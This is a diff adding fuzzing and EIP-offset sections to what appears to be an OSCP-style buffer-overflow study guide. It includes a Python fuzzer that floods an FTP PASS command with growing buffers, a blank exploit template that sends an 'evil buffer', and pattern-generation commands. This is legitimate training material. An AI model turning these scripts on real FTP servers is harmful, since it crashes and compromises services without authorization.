@@ -88,3 +88,92 @@ Mona is a powerful plugin for Immunity Debugger, written in python, that makes e
 ```
 !mona config -set workingfolder c:\mona\%p
 ```
+## FUZZING
+
+Fuzzing is the process of sending increasing lengths of data in order to crash the application, and then using a debugger to verify that EIP has been overwritten.
+
+The sample python code below can be modified to automate that task. It will send the character A's `\x41` in hex).
+
+
+### fuzz.py
+```python
+import socket, time, sys
+
+ip = "10.0.0.1"
+port = 21
+timeout = 5
+
+# Create an array of increasing length buffer strings.
+buffer = []
+counter = 100
+while len(buffer) < 30:
+    buffer.append("A" * counter)
+    counter += 100
+
+for string in buffer:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        connect = s.connect((ip, port))
+        s.recv(1024)
+        s.send("USER username\r\n")
+        s.recv(1024)
+
+        print("Fuzzing PASS with %s bytes" % len(string))
+        s.send("PASS " + string + "\r\n")
+        s.recv(1024)
+        s.send("QUIT\r\n")
+        s.recv(1024)
+        s.close()
+    except:
+        print("Could not connect to " + ip + ":" + str(port))
+        sys.exit(0)
+    time.sleep(1)
+```
+
+## EIP
+
+First step is going to be to find the EIP register, here is a template for the actual expoit that can be modified to find and create the buffer overflow.
+
+```python
+import socket
+
+ip = "10.0.0.1"
+port = 21
+
+prefix = ""
+offset = 0
+overflow = "A" * offset
+retn = ""
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+    s.connect((ip, port))
+    print("Sending evil buffer...")
+    s.send(buffer + "\r\n")
+    print("Done!")
+except:
+    print("Could not connect.")
+```
+
+
+With the <length> of bytes that caused the crash add 400 to make sure there is enough space for your shellcode. The guide written for this has you using the metasploit module pattern_create, but since we are already using mona from within mona, there is no reason not to just do this step on the target.
+
+
+From within immunity CLI
+
+`!mona pc <length>`
+
+-OR-
+
+Using metasploit (one of the modules allowed for OSCP)
+
+`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>|xclip -selection clipboard
+
+
